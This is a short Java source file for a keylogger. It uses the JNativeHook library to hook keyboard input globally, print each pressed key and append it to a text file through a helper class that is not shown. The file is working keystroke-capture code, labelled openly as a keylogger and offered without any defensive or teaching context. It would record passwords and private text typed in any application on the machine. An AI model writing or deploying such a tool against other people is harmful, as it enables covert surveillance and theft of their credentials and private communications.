import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.GlobalScreen;

import java.io.IOException;

public class Keylogger implements NativeKeyListener {

    public static void main(String[] args) throws NativeHookException {
        Keylogger keyboard = new Keylogger();

        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(keyboard);

    }
    public void nativeKeyPressed(NativeKeyEvent e) {
        String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println("Pressed: " + pressed);
        try {
            TextFile.toTxt(pressed);
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
    }
}